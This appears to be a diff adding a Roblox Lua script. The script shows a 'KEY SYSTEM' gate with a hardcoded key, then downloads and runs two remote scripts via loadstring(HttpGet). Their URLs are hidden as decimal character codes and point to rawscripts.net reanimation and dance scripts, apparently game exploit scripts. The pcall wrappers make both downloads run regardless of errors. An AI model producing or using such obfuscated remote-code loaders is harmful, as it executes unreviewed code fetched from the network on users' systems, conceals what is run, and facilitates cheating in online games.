@@ -1,0 +1,114 @@
+-- =====================================
+-- GUARANTEED FAILSAFE GATE
+-- =====================================
+
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer
+
+-- ===============================
+-- KEY (UNICODE SAFE)
+-- ===============================
+
+local function buildKey()
+    local a = "ü1ğ2ps91m-818"
+    local b = "<>'8so888*#*oi19"
+    local c = "-*#,&×>-*end"
+    local d = "codedstrin62"
+    return a .. b .. c .. d
+end
+
+local function checkKey(input)
+    return type(input) == "string" and input == buildKey()
+end
+
+-- ===============================
+-- GUI
+-- ===============================
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "KeyGuiGuaranteed"
+gui.ResetOnSpawn = false
+pcall(function()
+    gui.Parent = lp:WaitForChild("PlayerGui",5) or game.CoreGui
+end)
+
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0,360,0,210)
+frame.Position = UDim2.new(0.5,-180,0.5,-105)
+frame.BackgroundColor3 = Color3.fromRGB(22,22,22)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0,12)
+
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1,0,0,42)
+title.BackgroundTransparency = 1
+title.Text = "KEY SYSTEM"
+title.Font = Enum.Font.GothamBold
+title.TextScaled = true
+title.TextColor3 = Color3.new(1,1,1)
+
+local box = Instance.new("TextBox", frame)
+box.PlaceholderText = "Key buraya yapıştır"
+box.Size = UDim2.new(0.9,0,0,46)
+box.Position = UDim2.new(0.05,0,0.35,0)
+box.BackgroundColor3 = Color3.fromRGB(35,35,35)
+box.TextColor3 = Color3.new(1,1,1)
+box.Font = Enum.Font.Gotham
+box.TextScaled = true
+box.ClearTextOnFocus = false
+Instance.new("UICorner", box)
+
+local btn = Instance.new("TextButton", frame)
+btn.Text = "CHECK KEY"
+btn.Size = UDim2.new(0.9,0,0,42)
+btn.Position = UDim2.new(0.05,0,0.67,0)
+btn.BackgroundColor3 = Color3.fromRGB(60,120,255)
+btn.TextColor3 = Color3.new(1,1,1)
+btn.Font = Enum.Font.GothamBold
+btn.TextScaled = true
+Instance.new("UICorner", btn)
+
+-- ===============================
+-- URL DECODE
+-- ===============================
+
+local function dec(d)
+    local s=""
+    for n in string.gmatch(d,"%d+") do
+        s = s .. string.char(tonumber(n))
+    end
+    return s
+end
+
+local URL1 = dec("104/116/116/112/115/58/47/47/114/97/119/115/99/114/105/112/116/115/46/110/101/116/47/114/97/119/47/85/110/105/118/101/114/115/97/108/45/83/99/114/105/112/116/45/77/121/119/111/114/108/100/45/114/101/97/110/105/109/97/116/101/45/111/108/100/104/97/99/102/97/114/100/115/45/114/101/97/110/105/109/97/116/105/111/110/45/115/99/114/105/112/116/45/86/50/45/57/50/49/56/54")
+local URL2 = dec("104/116/116/112/115/58/47/47/114/97/119/115/99/114/105/112/116/115/46/110/101/116/47/114/97/119/47/85/110/105/118/101/114/115/97/108/45/83/99/114/105/112/116/45/70/73/88/69/68/45/75/114/121/115/116/97/108/45/68/97/110/99/101/45/86/51/45/52/56/54/56/50")
+
+-- ===============================
+-- BUTTON LOGIC (FAILSAFE)
+-- ===============================
+
+btn.MouseButton1Click:Connect(function()
+    if not checkKey(box.Text) then
+        btn.Text = "WRONG KEY"
+        task.delay(1,function()
+            btn.Text = "CHECK KEY"
+        end)
+        return
+    end
+
+    gui:Destroy()
+
+    -- 1. script: dene, hata olsa bile devam et
+    pcall(function()
+        loadstring(game:HttpGet(URL1))()
+    end)
+
+    task.wait(5)
+
+    -- 2. script: HER ŞEKİLDE dene
+    pcall(function()
+        loadstring(game:HttpGet(URL2))()
+    end)
+end)
